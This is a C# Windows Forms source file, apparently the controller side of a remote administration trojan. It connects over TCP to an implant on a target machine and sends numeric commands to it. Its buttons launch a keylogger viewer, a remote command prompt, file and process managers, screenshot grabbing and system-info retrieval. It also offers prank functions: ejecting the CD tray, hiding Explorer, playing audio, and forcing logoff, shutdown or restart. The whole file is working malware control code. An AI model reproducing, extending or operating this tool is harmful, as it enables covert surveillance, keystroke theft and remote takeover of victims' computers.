using System;
using System.Drawing;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace ClientMain
{
    public partial class ClientMain : Form
    {
        public ClientMain()
        {
            InitializeComponent();
        }

        // FUNCTION DECLARATION
        [DllImport("iphlpapi.dll", CharSet = CharSet.Auto)]
        public static extern int GetBestInterface(UInt32 DestAddr, out UInt32 BestIfIndex);

        // GLOBAL VARIABLES
        public static IPAddress[] ipClient;
        public static IPAddress[] ipServer;
        public static IPEndPoint epClient, epServer;
        public static Socket socketAccept, socketConnect, socketListen;
        public static bool connection;
        public static string connectionMode;
        public static bool connectionFailure = false;
        public static byte[] commandNo = new byte[1];

        public void hideAllControls()
        {
            groupBoxManager.Visible = false;
            groupBoxWindows.Visible = false;
            groupBoxFun.Visible = false;
            groupBoxMisc.Visible = false;
            groupBoxServer.Visible = false;
        }

        private void buttonManagers_Click(object sender, EventArgs e)
        {
            hideAllControls();
            groupBoxManager.Visible = true;
        }

        private void buttonWindows_Click(object sender, EventArgs e)
        {
            hideAllControls();
            groupBoxWindows.Visible = true;
        }

        private void buttonFun_Click(object sender, EventArgs e)
        {
            hideAllControls();
            groupBoxFun.Visible = true;
        }

        private void buttonMisc_Click(object sender, EventArgs e)
        {
            hideAllControls();
            groupBoxMisc.Visible = true;
        }

        private void buttonServer_Click(object sender, EventArgs e)
        {
            hideAllControls();
            groupBoxServer.Visible = true;
        }

        private void buttonAbout_Click(object sender, EventArgs e)
        {
            About formAbout = new About();
            About.mainForm = this;
            formAbout.Show();
            this.Visible = false;
        }

        private void ClientMain_Load(object sender, EventArgs e)
        {
            this.Size = new Size(408, 273);
            groupBox3.Size = new Size(199, 177);
            groupBoxWindows.Location = new Point(87, 0);
            groupBoxFun.Location = new Point(87, 0);
            groupBoxMisc.Location = new Point(87, 0);
            groupBoxServer.Location = new Point(87, 0);
            hideAllControls();
            groupBoxManager.Visible = true;
        }

        private void buttonConnect_Click(object sender, EventArgs e)
        {
            if (connection == true)
                return;
            if (textBoxIP.Text == "")
            {
                MessageBox.Show("Enter Server IP!");
                return;
            }
            if (textBoxPort.Text == "")
            {
                MessageBox.Show("Enter Server Port No.!");
                return;
            }
            if (textBoxClientIP.Text == "")
            {
                MessageBox.Show("Enter Client IP!");
                return;
            }
            if (textBoxClientPort.Text == "")
            {
                MessageBox.Show("Enter Client Port No.!");
                return;
            }
            connectionMode = "CON";
            connectionVariablesInitialize();
            if (connectionFailure == true)
            { 
                MessageBox.Show("Invalid Connection Parameters!");
                connectionFailure = false;
                return;
            }
            connectionInitiation();
            connectionListen();
            LabelStatus.Text = "Connected";
            connection = true;
        }

        private void buttonGo_Click(object sender, EventArgs e)
        {
            if (connection == true)
                return;
            if (textBoxClientIP.Text == "")
            {
                MessageBox.Show("Enter Client IP!");
                return;
            }
            if (textBoxSinPort.Text == "")
            {
                MessageBox.Show("Enter Client Port No.!");
                return;
            }
            connectionMode = "SIN";
            connectionVariablesInitialize();
            if (connectionFailure == true)
            {
                MessageBox.Show("Invalid Connection Parameters!");
                connectionFailure = false;
                return;
            }
            connectionListen();
            connectionInitiation();
            LabelStatus.Text = "Connected";
            connection = true;
        }

        public void connectionVariablesInitialize()
        {
            try
            {
                ipClient = Dns.GetHostAddresses(textBoxClientIP.Text);
                if (connectionMode == "CON")
                    epClient = new IPEndPoint(ipClient[0], int.Parse(textBoxClientPort.Text));
                else
                    epClient = new IPEndPoint(ipClient[0], int.Parse(textBoxSinPort.Text));
                socketListen = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                if (connectionMode == "CON")
                {
                    try
                    {
                        ipServer = Dns.GetHostAddresses(textBoxIP.Text);
                        epServer = new IPEndPoint(ipServer[0], int.Parse(textBoxPort.Text));
                        socketConnect = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    }
                    catch (Exception)
                    {
                        connectionFailure = true;
                    }
                }
                connectionFailure = false;
            }
            catch (Exception)
            {
                connectionFailure = true;
            }
        }

        public void connectionInitiation()
        {
            if (connectionMode == "SIN")
            {
                ipServer = Dns.GetHostAddresses(((IPEndPoint)socketAccept.RemoteEndPoint).Address.ToString());
                epServer = new IPEndPoint(ipServer[0], int.Parse(textBoxSinPort.Text) + 1);
                socketConnect = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            }
            while (!socketConnect.Connected)
            {
                try
                {
                    socketConnect.Connect(epServer);
                }
                catch (Exception) { }
            }
        }

        public void connectionListen()
        {
            socketListen.Bind(epClient);
            socketListen.Listen(1);
            socketAccept = socketListen.Accept();
        }

        public void connectionTermination()
        {
            connection = false;
            connectionFailure = false;
            try
            {
                socketAccept.Close();
                socketConnect.Close();
                socketListen.Close();
            }
            catch (Exception) { }
            LabelStatus.Text = "Disconnected";
        }

        private void buttonSnapshot_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            SnapshotGrabber snapshotForm = new SnapshotGrabber();
            this.Visible = false;
            SnapshotGrabber.mainForm = this;
            snapshotForm.Show();
            if (connectionFailure == true)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonFileManager_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 10;
                socketConnect.Send(commandNo);
                FileManager fileForm = new FileManager();
                this.Visible = false;
                FileManager.mainForm = this;
                fileForm.Show();
            }
            catch (Exception)
            {
                connectionFailure = true;
            }
            if (connectionFailure == true)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonProcessManager_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            ProcessManager processForm = new ProcessManager();
            this.Visible = false;
            ProcessManager.mainForm = this;
            processForm.Show();
            if (connectionFailure == true)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonKeylogger_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            KeyLogger keylogForm = new KeyLogger();
            this.Visible = false;
            KeyLogger.mainForm = this;
            keylogForm.Show();
            if (connectionFailure == true)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonLogoff_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 30;
                socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonPoweroff_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try{
            commandNo[0] = 31;
            socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonRestart_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try{
            commandNo[0] = 32;
            socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonSysInfo_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 52;
                socketConnect.Send(commandNo);
                byte[] sysData = new byte[20 * 1024];
                int size;
                while ((size = socketAccept.Receive(sysData)) == 0) ;
                FileStream fs = File.OpenWrite(Directory.GetCurrentDirectory() + "\\sysinfo.txt");
                fs.Write(sysData, 0, size);
                fs.Close();
            }
            catch (Exception)
            {
                connectionTermination();
            }
        }

        private void buttonCloseServer_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 60;
                socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
            }
            connectionTermination();
        }

        private void buttonHideExplorer_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 42;
                socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonCDTray_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 41;
                socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonKillServer_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            try
            {
                commandNo[0] = 61;
                socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
            }
            connectionTermination();
        }

        private void buttonDisconnect_Click(object sender, EventArgs e)
        {
            try
            {
                if (connection == true)
                {
                    commandNo[0] = 1;
                    socketConnect.Send(commandNo);
                    connectionTermination();
                }
                else
                    MessageBox.Show("No Active Connection Found!");
            }
            catch (Exception)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }

        private void buttonAudioPlay_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            if (openAudioDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    commandNo[0] = 40;
                    socketConnect.Send(commandNo);
                    FileInfo fi = new FileInfo(openAudioDialog.FileName);
                    BinaryFormatter formatter = new BinaryFormatter();
                    MemoryStream sizeStream = new MemoryStream();
                    formatter.Serialize(sizeStream, fi.Name);
                    socketConnect.Send(sizeStream.ToArray());
                    byte[] ack = new byte[1];
                    while (socketAccept.Receive(ack) == 0) ;
                    if (ack[0] == 2)
                    {
                        FileStream fs = File.OpenRead(openAudioDialog.FileName);
                        byte[] data = new byte[(int)fs.Length];
                        fs.Read(data, 0, (int)fs.Length);
                        fs.Close();
                        sizeStream = new MemoryStream();
                        formatter.Serialize(sizeStream, data.Length);
                        socketConnect.Send(sizeStream.ToArray());
                        while (socketAccept.Receive(ack) == 0) ;
                        socketConnect.Send(data);
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("Connection Terminated!");
                    connectionTermination();
                }
            }
        }

        private void ClientMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                if (connection == true)
                {
                    commandNo[0] = 1;
                    socketConnect.Send(commandNo);
                }
            }
            catch (Exception) { }
        }

        private void buttonCmd_Click(object sender, EventArgs e)
        {
            if (!connection)
            {
                MessageBox.Show("No Connection Found!");
                return;
            }
            CommandPrompt cmdForm = new CommandPrompt();
            this.Visible = false;
            CommandPrompt.mainForm = this;
            cmdForm.Show();
            if (connectionFailure == true)
            {
                MessageBox.Show("Connection Terminated!");
                connectionTermination();
            }
        }
    }
}
